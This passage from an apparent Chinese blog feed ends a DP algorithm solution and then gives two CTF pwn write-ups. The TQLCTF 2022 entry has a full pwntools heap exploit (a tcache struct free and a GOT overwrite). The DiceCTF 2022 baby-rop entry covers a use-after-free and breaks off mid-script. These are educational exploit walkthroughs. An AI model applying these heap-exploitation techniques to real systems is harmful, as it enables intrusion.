中，有些数字本身就可以由其他数字通过操作2、3生成出来，这种数字就不能再拿去生成新的数字了，否则会造成重复。这里有一个显然的性质，即一个数字肯定是由比它小的数字生成出来的，所以我们可以先把数组 <code>a[1...n]</code> 排个序，用一个set保存已经用过的数字，从小到大考虑，将这个数字按照操作2、3的逆操作不断还原，然后去set中检查是否用过，如果用过就不再用它去生成新的数字。具体做法如下：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">set<span class="token operator">&lt;</span>LL<span class="token operator">></span> vis<span class="token punctuation">;</span><span class="token keyword">bool</span> <span class="token function">check</span><span class="token punctuation">(</span>LL num<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>vis<span class="token punctuation">.</span><span class="token function">count</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>num<span class="token operator">&amp;</span><span class="token number">1</span><span class="token punctuation">)</span>            num<span class="token operator">>>=</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>num<span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                num<span class="token operator">>>=</span><span class="token number">2</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span>                <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;bits/stdc++.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">long</span> <span class="token keyword">long</span> LL<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> MAXN <span class="token operator">=</span> <span class="token number">2e5</span><span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">;</span><span class="token keyword">const</span> LL MOD <span class="token operator">=</span> <span class="token number">1e9</span><span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">;</span>LL dp<span class="token punctuation">[</span>MAXN<span class="token punctuation">]</span><span class="token punctuation">;</span>LL a<span class="token punctuation">[</span>MAXN<span class="token punctuation">]</span><span class="token punctuation">,</span>ra<span class="token punctuation">[</span>MAXN<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    dp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>MAXN<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>MOD<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>MAXN<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>MOD<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">calen</span><span class="token punctuation">(</span>LL num<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> ret<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        num<span class="token operator">>>=</span><span class="token number">1</span><span class="token punctuation">;</span>        ret<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> ret<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>set<span class="token operator">&lt;</span>LL<span class="token operator">></span> vis<span class="token punctuation">;</span><span class="token keyword">bool</span> <span class="token function">check</span><span class="token punctuation">(</span>LL num<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>vis<span class="token punctuation">.</span><span class="token function">count</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>num<span class="token operator">&amp;</span><span class="token number">1</span><span class="token punctuation">)</span>            num<span class="token operator">>>=</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>num<span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                num<span class="token operator">>>=</span><span class="token number">2</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span>                <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// freopen("in.txt", "r", stdin);</span>    <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span>p<span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>n<span class="token punctuation">,</span><span class="token operator">&amp;</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%lld"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sort</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>a<span class="token operator">+</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> m<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">check</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            ra<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token operator">=</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            m<span class="token operator">++</span><span class="token punctuation">;</span>            vis<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    LL ans<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> tlen<span class="token operator">=</span><span class="token function">calen</span><span class="token punctuation">(</span>ra<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>tlen<span class="token operator">></span>p<span class="token punctuation">)</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        ans<span class="token operator">=</span><span class="token punctuation">(</span>ans<span class="token operator">+</span>dp<span class="token punctuation">[</span>p<span class="token operator">-</span>tlen<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>MOD<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%lld\n"</span><span class="token punctuation">,</span>ans<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TQLCTF 2022</title>
      <link href="/2022/02/20/tqlctf-2022/"/>
      <url>/2022/02/20/tqlctf-2022/</url>
      
        <content type="html"><![CDATA[<h1 id="TQLCTF-2022"><a href="#TQLCTF-2022" class="headerlink" title="TQLCTF 2022"></a>TQLCTF 2022</h1><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="unbelievable-write"><a href="#unbelievable-write" class="headerlink" title="unbelievable_write"></a>unbelievable_write</h3><p>有一次机会可以free堆上任意的一个地址：</p><pre class="line-numbers language-none"><code class="language-none">void c2()&#123;  __int64 v0; &#x2F;&#x2F; rbx  int offset; &#x2F;&#x2F; eax  if ( golden &#x3D;&#x3D; 1 )  &#123;    golden &#x3D; 0LL;    v0 &#x3D; ptr;    offset &#x3D; read_int();&#x2F;&#x2F; offset 可以是负数    free((void *)(v0 + offset));  &#125;  else  &#123;    puts(&quot;no!&quot;);  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>思路就是把保存 <code>tcache_perthread_struct</code> 的chunk给释放掉，然后篡改里面的 <code>counts</code> 字段和 <code>entries</code> 字段，找一个 <code>entry</code> 直接指向 <code>target(0x404080)</code>，然后直接分配对应大小的chunk，实现修改target。</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSE&lt;-- 这个Addr: 0x405000Size: 0x291Allocated chunk | PREV_INUSEAddr: 0x405290Size: 0x21Top chunk | PREV_INUSEAddr: 0x4052b0Size: 0x20d51<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>另外，为了绕过 <code>free</code> 函数对target的检查，需要取消掉 free。可以将 <code>free@got</code> 修改成 <code>*retn + *endbr64</code>，后面加 <code>endbr64</code> 那段gadget是因为我们的输入会附带一个 ‘\n’，但是 <code>free@got</code> 的后面又必须要这段gadget。</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; gotGOT protection: Partial RELRO | GOT functions: 11 [0x404018] free@GLIBC_2.2.5 -&gt; 0x401030 ◂— endbr64 [0x404020] puts@GLIBC_2.2.5 -&gt; 0x401040 ◂— endbr64 [0x404028] write@GLIBC_2.2.5 -&gt; 0x401050 ◂— endbr64......<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">.</span>plt<span class="token punctuation">:</span><span class="token number">0000000000401040</span> sub_401040      proc near<span class="token punctuation">.</span>plt<span class="token punctuation">:</span><span class="token number">0000000000401040</span>                 endbr64<span class="token punctuation">.</span>plt<span class="token punctuation">:</span><span class="token number">0000000000401044</span>                 push    <span class="token number">1</span><span class="token punctuation">.</span>plt<span class="token punctuation">:</span><span class="token number">0000000000401049</span>                 bnd jmp sub_401020<span class="token punctuation">.</span>plt<span class="token punctuation">:</span><span class="token number">0000000000401049</span> sub_401040      endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>EXP</strong><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">,</span> terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'sp'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> binary <span class="token operator">=</span> <span class="token string">'./pwn'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">cho</span><span class="token punctuation">(</span>ind<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'> '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ind<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>sz<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    cho<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>free_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span>cho<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0x290</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 0x100, 0x110</span>payload <span class="token operator">=</span> p16<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">15</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token operator">-</span><span class="token number">17</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0xf</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x404080</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>free_got<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x280</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>retn <span class="token operator">=</span> <span class="token number">0x4014C3</span>endbr64 <span class="token operator">=</span> <span class="token number">0x401040</span>add<span class="token punctuation">(</span><span class="token number">0x110</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>retn<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>endbr64<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>cho<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DiceCTF 2022</title>
      <link href="/2022/02/19/dicectf-2022/"/>
      <url>/2022/02/19/dicectf-2022/</url>
      
        <content type="html"><![CDATA[<h1 id="DiceCTF-2022"><a href="#DiceCTF-2022" class="headerlink" title="DiceCTF 2022"></a>DiceCTF 2022</h1><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="baby-rop"><a href="#baby-rop" class="headerlink" title="baby-rop"></a>baby-rop</h3><ol><li><p>基本信息</p><pre class="line-numbers language-none"><code class="language-none">[*] &#39;&#x2F;home&#x2F;ubuntu&#x2F;CTF_ROOM&#x2F;game&#x2F;dice_ctf_2022&#x2F;pwn&#x2F;baby-rop&#x2F;babyrop&#39;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x3fe000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">$ seccomp-tools dump .&#x2F;babyrop 2.342.34glibc 2.34 line  CODE  JT   JF      K&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 0000: 0x20 0x00 0x00 0x00000004  A &#x3D; arch 0001: 0x15 0x01 0x00 0xc000003e  if (A &#x3D;&#x3D; ARCH_X86_64) goto 0003 0002: 0x06 0x00 0x00 0x00000000  return KILL 0003: 0x20 0x00 0x00 0x00000000  A &#x3D; sys_number 0004: 0x15 0x00 0x01 0x0000000a  if (A !&#x3D; mprotect) goto 0006 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0006: 0x15 0x00 0x01 0x00000009  if (A !&#x3D; mmap) goto 0008 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0008: 0x15 0x00 0x01 0x0000000b  if (A !&#x3D; munmap) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0010: 0x15 0x00 0x01 0x000000e7  if (A !&#x3D; exit_group) goto 0012 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0012: 0x15 0x00 0x01 0x00000000  if (A !&#x3D; read) goto 0014 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0014: 0x15 0x00 0x01 0x00000001  if (A !&#x3D; write) goto 0016 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0016: 0x15 0x00 0x01 0x00000002  if (A !&#x3D; open) goto 0018 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0018: 0x15 0x00 0x01 0x00000003  if (A !&#x3D; close) goto 0020 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0020: 0x15 0x00 0x01 0x00000101  if (A !&#x3D; openat) goto 0022 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0022: 0x15 0x00 0x01 0x00000005  if (A !&#x3D; fstat) goto 0024 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0024: 0x15 0x00 0x01 0x0000000c  if (A !&#x3D; brk) goto 0026 0025: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0026: 0x15 0x00 0x01 0x00000106  if (A !&#x3D; newfstatat) goto 0028 0027: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0028: 0x15 0x00 0x01 0x00000010  if (A !&#x3D; ioctl) goto 0030 0029: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0030: 0x15 0x00 0x01 0x00000008  if (A !&#x3D; lseek) goto 0032 0031: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0032: 0x06 0x00 0x00 0x00000000  return KILL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>给程序修改libc可<a href="https://lexsd6.github.io/2021/03/25/%E4%BF%AE%E6%94%B9ELF%E6%96%87%E4%BB%B6libc%E4%B8%BA%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC/#:~:text=glibc-all-in-one%EF%BC%8C%E6%AD%A3%E5%A6%82%E5%85%B6%E5%90%8D%E6%98%AF%E4%B8%80%E4%B8%AA%E5%A4%9A%E7%89%88%E6%9C%AClibc%E7%9A%84%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%8C%E4%B8%BB%E8%A6%81%E6%94%AF%E6%8C%812.19%EF%BC%8C2.23-2.29%E7%89%88%E6%9C%AC%E7%9A%84libc%E5%92%8Ci686%2C,amd64%E7%9A%84%E6%9E%B6%E6%9E%84%E3%80%82">参考</a>。</p></li><li><p>漏洞点： <code>free_safe_string</code> 函数中 <code>free</code> 之后没有清除指针，可以uaf。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> __fastcall <span class="token function">free_safe_string</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>ptr<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h]</span>  ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>data_storage<span class="token punctuation">[</span>a1<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>在 <code>create_safe_string</code> 函数中，先 <code>malloc</code> 一个16字节的note，这个note中前8个字节保存safe_string的长度，然后 <code>malloc</code>一段能够保存safe_string的空间，将指针保存到note的后8个字节中。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> __fastcall <span class="token function">create_safe_string</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> ind<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  size_t <span class="token operator">*</span>note<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h]</span>  note <span class="token operator">=</span> <span class="token punctuation">(</span>size_t <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token string">"How long is your safe_string: "</span><span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> <span class="token number">0x1EuLL</span><span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%zu"</span><span class="token punctuation">,</span> note<span class="token punctuation">)</span><span class="token punctuation">;</span>  note<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>size_t<span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token operator">*</span>note<span class="token punctuation">)</span><span class="token punctuation">;</span>  data_storage<span class="token punctuation">[</span>ind<span class="token punctuation">]</span> <span class="token operator">=</span> note<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">write_safe_string</span><span class="token punctuation">(</span>ind<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如此，可以用那个经典的“增增删删增”套路来实现任意地址读写。如下所示，payload会写到note0中，将payload的后8个字节设置成我们要读/写的地址，通过 <code>read_safe_string/write_safe_string</code> 完成后续操作。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">_create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token string">b'aaaa'</span><span class="token punctuation">)</span>_create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token string">b'aaaa'</span><span class="token punctuation">)</span>_free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>_free<span class="token 